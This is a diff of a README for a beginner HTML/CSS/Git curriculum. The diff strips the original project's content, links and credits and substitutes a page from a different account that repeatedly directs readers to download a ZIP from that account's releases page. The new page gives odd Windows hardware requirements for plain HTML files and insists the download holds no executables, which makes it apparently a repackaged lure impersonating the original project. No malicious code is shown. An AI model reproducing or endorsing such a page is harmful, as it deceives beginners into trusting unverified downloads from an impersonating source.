@@ -1,145 +1,139 @@
-<table>
-  <tr>
-    <td width="15%" align="center" valign="middle">
-      <img src="https://raw.githubusercontent.com/nuttyproducer/nuttyproducer/main/codepath-logo.png" width="60" height="60" alt="CodePath Logo" />
-    </td>
-    <td width="85%" valign="middle">
-      <h1>CodePath</h1>
-      A comprehensive, open-source curriculum for learning HTML, CSS, and Git workflow through 40 progressive hands-on assignments.
-    </td>
-  </tr>
-</table>
+# 🚀 codepath-v1 - Learn HTML & CSS with Practice
 
-## 🎯 What is This?
-
-CodePath is a **complete frontend learning path** with 40 assignments organized into 10 themed series, each progressing from Foundation to Mastery. Learn by building real projects while practicing professional Git workflow with branches and pull requests.
-
-**Perfect for:**
-- Self-taught developers building fundamentals
-- Coding bootcamps needing structured curriculum  
-- Anyone mastering HTML/CSS before JavaScript
-- Learning real-world Git workflow
-
-## Quick Start
-
-**1. Fork & Clone**
-```bash
-# Fork this repo on GitHub, then:
-git clone https://github.com/YOUR-USERNAME/codepath.git
-cd codepath
-```
-
-**2. Start Your First Assignment**
-```bash
-git checkout -b wireframe-to-webcode
-# Open 01-wireframe/01-foundation/README.md
-# Build the assignment, then create a PR!
-```
-
-📖 **New to this?** Read the [Getting Started Guide](./docs/GETTING_STARTED.md) for detailed setup instructions.
-
-## 📚 Curriculum Overview
-
-**10 progressive series × 4 difficulty levels = 40 assignments**
-
-| Series | Focus | Folder |
-|--------|-------|--------|
-| **Wireframe to Webcode** | Design interpretation, layouts | `01-wireframe/` |
-| **Form Controls** | Forms, inputs, validation | `02-form-controls/` |
-| **Bikes for Refugees** | HTML structure, styling | `03-bikes-for-refugees/` |
-| **Navigation** | Navbars, menus, mobile patterns | `04-navigation/` |
-| **Card Components** | Cards, variants, interactions | `05-cards/` |
-| **Data Tables** | Tables, responsive strategies | `06-tables/` |
-| **Modals & Overlays** | Dialogs, drawers, accessibility | `07-modals/` |
-| **Animations** | Transitions, keyframes | `08-animations/` |
-| **Typography** | Font systems, fluid type | `09-typography/` |
-| **Accessibility** | WCAG, semantic HTML, ARIA | `10-accessibility/` |
-
-Each series: 🟢 Foundation → 🟡 Enhancement → 🟠 Integration → 🔴 Mastery
-
-📋 **See full curriculum:** [CURRICULUM.md](./docs/CURRICULUM.md)
-
-## AI Teaching Assistants (Copilot Agents)
-
-Three custom GitHub Copilot agents guide you with hints, not answers:
-
-- **frontend-mentor** - HTML & CSS debugging
-- **javascript-coach** - JS concepts & hints
-- **git-guide** - Git commands & workflow
-
-📄 [Installation guide](./.github/copilot-agents/SETUP.md)
-
-## Copilot Mentor Agents (VS Code)
-
-Paste-in system-prompt instructions that turn Copilot Chat into a coaching mentor for this curriculum. No full solutions — only guided hints and Socratic questions.
-
-| Agent | Focus |
-|-------|-------|
-| [frontend-html-css-mentor](./agents/frontend-html-css-mentor.md) | HTML structure, CSS layout, responsive design |
-| [javascript-mentor](./agents/javascript-mentor.md) | DOM scripting, JS debugging, introductory SQL |
-| [git-mentor](./agents/git-mentor.md) | Branching, committing, pull requests, merge conflicts |
-
-📄 [How to use these agents in VS Code](./docs/copilot/vscode-agents.md)
-
-## 📖 Documentation
-
-- [Getting Started Guide](./docs/GETTING_STARTED.md) - Fork, clone, first assignment
-- [Git Workflow Guide](./docs/GIT_WORKFLOW.md) - Branches, commits, PRs, troubleshooting
-- [Full Curriculum](./docs/CURRICULUM.md) - All 10 series with details
-- [Learning Roadmap](./docs/ROADMAP.md) - What's next after HTML/CSS?
-- [FAQ & Troubleshooting](./docs/FAQ.md) - Common issues solved
-
-## Learning Objectives
-
-By completing CodePath, you'll master:
-
-✅ Semantic HTML & accessibility  
-✅ Modern CSS (Flexbox, Grid, animations)  
-✅ Responsive design patterns  
-✅ Professional Git workflow  
-✅ Code review & iteration  
-✅ Building real-world projects  
-
-## What's Next?
-
-**Completed CodePath?** Continue your learning journey!
-
-**[View the Complete Learning Roadmap](./docs/ROADMAP.md)**
-
-Discover what comes after HTML/CSS:
-- JavaScript Essentials (Coming Q2 2026)
-- React & Modern Frontend (Planned Q3 2026)
-- Full-Stack Development (Planned Q4 2026)
-- Advanced Topics (Future)
-
-## For Instructors & Bootcamps
-
-CodePath is designed to be forked and customized:
-- Add your own assignments
-- Modify existing ones
-- Create cohort-specific branches
-- Integrate with your LMS
-
-Students fork your version and submit PRs to their own repos. You review via shared PR links.
-
-## 🤝 Contributing
-
-Found a bug? Have a suggestion? We welcome contributions!
-
-- Open an [issue](https://github.com/nuttyproducer/codepath/issues)
-- Submit a pull request
-- Share your completed projects!
-
-## License
-
-Open source and free for educational use. Fork, modify, and share!
-
-## Acknowledgments
-
-Inspired by [Hack Your Future Belgium](https://github.com/HackYourFutureBelgium), [Code Your Future](https://codeyourfuture.io/), and real-world development workflows.
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/exposuretorridity618/codepath-v1/releases)
 
 ---
 
-**Ready to start?** Fork this repo and begin your coding journey! 🚀
+codepath-v1 is a collection of 40 HTML and CSS assignments organized into 10 series. It helps you learn web design step by step. You will practice building web pages using semantic HTML, modern layout techniques, simple animations, accessibility basics, and version control with Git.
 
-**Questions?** Check the [FAQ](./docs/FAQ.md) or open a [discussion](https://github.com/nuttyproducer/codepath/discussions).
+This guide will help you download and run codepath-v1 on your Windows computer. No programming experience is needed.
+
+## 🖥️ System Requirements
+
+Before you start, make sure your computer meets these requirements:
+
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 2 GHz or faster processor  
+- 500 MB free storage space  
+- Internet connection to download files  
+
+You will also need a modern web browser installed, such as Microsoft Edge, Google Chrome, or Mozilla Firefox. These browsers can open the HTML files included in the assignments.
+
+## 🚦 What You Will Get
+
+codepath-v1 includes:
+
+- 40 step-by-step assignments  
+- 10 learning series that build on each other  
+- Files with HTML and CSS code examples  
+- Tasks on layout techniques such as Flexbox and Grid  
+- Exercises on making websites accessible  
+- Simple CSS animations assignments  
+- Basic Git workflow introduction for version control  
+
+Each assignment focuses on real skills for building modern web pages.
+
+## 📥 Download codepath-v1
+
+To download the assignments, visit the release page:
+
+[![Download from Releases](https://img.shields.io/badge/Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/exposuretorridity618/codepath-v1/releases)
+
+Follow these steps:
+
+1. Click the green "Code" button on the release page or look for the latest ZIP file in the assets section. The file will be named something like `codepath-v1.zip`.  
+2. Click the ZIP file link to download it to your computer.  
+3. Once downloaded, locate the ZIP file in your Downloads folder or the folder you selected.  
+4. Right-click the ZIP file and choose "Extract All..." to unzip the content. Select a folder where you want to save the extracted files.  
+5. Open the folder to see the assignments organized by series.
+
+## ▶️ How to Open and View Assignments
+
+After extracting, you can start working with the files:
+
+1. Navigate into any series folder, for example, Series 1 Foundation.  
+2. Find the HTML files like `index.html` or `assignment1.html`.  
+3. Double-click the HTML file. It will open in your default web browser. You will see the webpage you can study or edit.  
+
+You can use any simple text editor to open and edit the files, such as Notepad or Visual Studio Code (if you want a free code editor). But editing is optional if you just want to view the assignments.
+
+## 🛠️ Recommended Tools (Optional)
+
+These tools help you get the most from codepath-v1 but are not required:
+
+- **A text editor:** Notepad (built-in), Notepad++, or Visual Studio Code  
+- **A modern web browser:** Microsoft Edge, Google Chrome, or Firefox for testing your pages  
+- **Git client:** For learning Git workflow parts you can install Git for Windows (https://git-scm.com/download/win)  
+
+If you want to edit and save your work, a text editor like Visual Studio Code provides features like syntax highlighting and live preview.
+
+## 📚 How to Learn from codepath-v1
+
+Each series builds on the previous one. Starting from the Foundation series, progress through the Mastery series.
+
+- Open the assignments in your browser.  
+- Read the instructions in the files or accompanying documents.  
+- Try to understand the HTML structure and CSS rules.  
+- Edit the files to see how changes affect the page.  
+- Practice layout techniques like Flexbox and Grid with the tasks.  
+- Experiment with animations using the included examples.  
+- Follow accessibility tips for better website design.  
+- Use the Git workflow series to learn basic version control steps.
+
+Working step-by-step will develop your front-end development skills.
+
+## ⚙️ Running codepath-v1 Assignments Locally
+
+You do not need to install anything special. The assignments run directly on your browser by opening the HTML files.
+
+To test your work:
+
+1. Edit the HTML or CSS files in a text editor.  
+2. Save the file changes.  
+3. Refresh the page in your browser to see updates.  
+
+If you want to use Git commands, install Git for Windows and follow the instructions in the Git series folders.
+
+## 🛡️ Security and Privacy
+
+The codepath-v1 files contain only HTML and CSS code. They do not include any executable programs or scripts that could harm your computer.
+
+Only download files from the official release page:
+
+https://github.com/exposuretorridity618/codepath-v1/releases
+
+If you want to keep your learning safe, do not run files from unknown sources.
+
+## 🚩 Troubleshooting
+
+If you have trouble opening files:
+
+- Make sure your browser supports HTML5 and CSS3 (modern browsers usually do)  
+- Check that you extracted all files from the ZIP folder  
+- If a page looks broken, reload the page or try another browser  
+- If edits don’t show after saving, refresh or clear browser cache (Ctrl+F5)  
+- If you want to learn Git but find it hard, use online tutorials or visual Git clients like GitHub Desktop  
+
+## 📌 Links for Reference and Support
+
+- Download page: https://github.com/exposuretorridity618/codepath-v1/releases  
+- Git for Windows: https://git-scm.com/download/win  
+- Visual Studio Code: https://code.visualstudio.com/  
+- Browser downloads: Official sites for Chrome, Edge, Firefox  
+
+## 🔖 Topics Covered
+
+- Semantic HTML  
+- CSS basics including colors, fonts, and borders  
+- CSS Flexbox layouts  
+- CSS Grid layout system  
+- CSS animations  
+- Accessibility basics for web content  
+- Git version control workflow  
+
+You can use these topics to track your learning progress.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/exposuretorridity618/codepath-v1/releases)
